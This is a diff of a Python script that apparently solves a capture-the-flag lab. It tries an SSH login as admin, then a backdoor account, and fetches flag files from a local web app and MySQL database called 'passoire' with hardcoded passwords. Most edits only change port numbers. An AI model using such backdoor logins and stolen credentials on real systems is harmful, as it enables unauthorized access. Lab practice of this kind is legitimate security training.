@@ -1,4 +1,3 @@
-from distutils.command.config import config
 from idlelib.query import Query
 from sys import flags
 
@@ -14,12 +13,12 @@ def ssh_backdoor():
     flags = {}
     
     try:
-        ssh.connect('localhost', port=10022, username='admin', password='98765432')
+        ssh.connect('localhost', port=2022, username='admin', password='98765432')
     except Exception as e:
         if "Authentication failed" in str(e):
             print("\033[1;31mUser 'Admin' Authentication failed, trying backdoor...\033[0m")
             try:
-                ssh.connect('localhost', port=10022, username='a', password='Backdoor')
+                ssh.connect('localhost', port=2022, username='a', password='backdoor')
             except Exception as e:
                 if "Authentication failed" in str(e):
                     print("\033[1;31mBackdoor Authentication failed, stop attacking with SSH\033[0m")
@@ -254,8 +253,8 @@ def http_get():
     # ============================
     # Flag 3
     # ============================
-    # http get http://localhost:10080/passoire/flag_3
-    r = requests.get('http://localhost:10080/passoire/flag_3')
+    # http get http://localhost:2080/passoire/flag_3
+    r = requests.get('http://localhost:2080/passoire/flag_3')
     if r.status_code == 200:
         flag = r.text.split('\n')[0].split(" ")[-1].replace(".", "")
         print(f"Flag 3: {flag}")
@@ -266,8 +265,8 @@ def http_get():
     # ============================
     # Flag 4
     # ============================
-    # http get http://localhost:10080/passoire/index.php, in the source code
-    r = requests.get('http://localhost:10080/passoire/index.php')
+    # http get http://localhost:2080/passoire/index.php, in the source code
+    r = requests.get('http://localhost:2080/passoire/index.php')
     if r.status_code == 200:
         lines = r.text.split('\n')
         flag_4 = ""
@@ -286,8 +285,8 @@ def http_get():
     # ============================
     # Flag 6
     # ============================
-    # http get http://localhost:10080/passoire/uploads/flag_6
-    r = requests.get('http://localhost:10080/passoire/uploads/flag_6')
+    # http get http://localhost:2080/passoire/uploads/flag_6
+    r = requests.get('http://localhost:2080/passoire/uploads/flag_6')
     if r.status_code == 200:
         flag = r.text.split('\n')[0].split(" ")[-1].replace(".", "")
         print(f"Flag 6: {flag}")
@@ -298,8 +297,8 @@ def http_get():
     # ============================
     # Flag 7
     # ============================
-    # http get http://localhost:10080/passoire/uploads/secret
-    r = requests.get('http://localhost:10080/passoire/uploads/secret')
+    # http get http://localhost:2080/passoire/uploads/secret
+    r = requests.get('http://localhost:2080/passoire/uploads/secret')
     if r.status_code == 200:
         flag = r.text.split('\n')[0].split(" ")[-1].replace(".", "")
         print(f"Flag 7: {flag}")
@@ -310,8 +309,8 @@ def http_get():
     # ============================
     # Flag 10
     # ============================
-    # http post http://localhost:13002/flag
-    r = requests.post('http://localhost:13002/flag')
+    # http post http://localhost:2002/flag
+    r = requests.post('http://localhost:2002/flag')
     if r.status_code == 200:
         flag = r.text.split('\n')[0].split(" ")[-1].replace(".", "").replace("\"", "").replace("}", "")
         print(f"Flag 10: {flag}")
@@ -320,7 +319,7 @@ def http_get():
         print("\033[1;31mFlag 10 not found\033[0m")
     
     
-    return {}
+    return flags    
 
 def sql():
     print("\033[1;32mTrying to get flags using MySQL...\033[0m")
@@ -328,7 +327,7 @@ def sql():
         'user': "passoire",
         'password': "gandalf",
         'host': "localhost",
-        'port': 13306,
+        'port': 2306,
         'database' : "passoire",
     }
     try:
@@ -354,4 +353,4 @@ if __name__ == '__main__':
     #flags = ssh_backdoor()
     http_get()
     #print(flags)
-    mysql()
+    #mysql()
